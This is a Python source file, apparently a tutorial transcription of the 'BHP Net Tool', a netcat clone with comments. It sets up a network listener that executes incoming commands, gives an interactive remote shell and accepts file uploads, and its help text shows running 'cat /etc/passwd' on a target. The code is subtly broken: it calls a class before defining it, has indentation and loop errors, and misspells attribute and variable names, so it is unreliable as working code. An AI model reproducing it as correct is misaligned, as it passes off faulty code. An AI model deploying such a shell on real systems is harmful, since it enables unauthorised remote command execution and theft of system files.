import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    
    # we’re using its check_output method, which runs a command on the local operating system and then returns the output from that command.
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,

        # We provide example usage that the program will display when the user invokes it with --help
        epilog=textwrap.dedent('''Example: 
        netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
        netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
        netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
        echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
        netcat.py -t 192.168.1.108 -p 5555 # connect to server
        '''))

# the -c argument sets up an interactive shell
# the -e argument executes one specific command
# the -l argument indicates that a listener should be set up
# the -p argument specifies the port on which to communicate
# the -t argument specifies the target IP
# the -u argument specifies the name of a file to upload
parser.add_argument('-c', '--command', action='store_true', help='command shell') 
parser.add_argument('-e', '--execute', help='execute specified command')
parser.add_argument('-l', '--listen', action='store_true', help='listen')
parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
parser.add_argument('-u', '--upload', help='upload file')
args = parser.parse_args()

# we invoke the NetCat object with an empty buffer string
if args.listen:
    buffer = ''
else: buffer = sys.stdin.read()

nc = NetCat(args, buffer.encode())
nc.run()
    
class NetCat:
    # We initialize the NetCat object with the arguments from the command line and the buffer
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer

        # create a socket object
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.lister:
            self.listen()
        else: self.send()

    def send(self):
        # We connect to the target and port, and if we have a buffer, we send that to the target first.
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        # we set up a try/catch block so we can manually close the connection with CTRL-C
        try:
            # receive data from the target
            while True:
                recv_len = 1
                response = ''

                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break # If there is no more data, we break out of the loop

                    if response:
                        print(response)
                        buffer = input('> ')
                        buffer += '\n'
                    
                # we print the response data and pause to get interactive input, send that input
                self.socket.send(buffer.encode())

        # interrupt the socket
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port)) # binds to the target and port

        # starts listening in a loop passing the connected socket
        self.socket.listen(5) 
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()


    def handle(self, clinet_socket):
        # execute a command, upload a file, or start a shell. If a command should be executed
        if self.args.execute:
            output = execute(self.args.execute)
            clinet_socket.send(output.encode())

        # we set up a loop to listen for content on the listening socket and receive data until there’s no more data coming in
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else: break

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
                message = f'Saved file {self.args.upload}'
                clinet_socket.send(message.encode())

        # we set up a loop, send a prompt to the sender, and wait for a command string to come back
        # we then execute the command by using the execute function and return the output of the command to the sender.
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    clinet_socket.send(b'BHP: #>')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += clinet_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        clinet_socket.send(response.encode())
                    cmd_buffer = b''
                
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

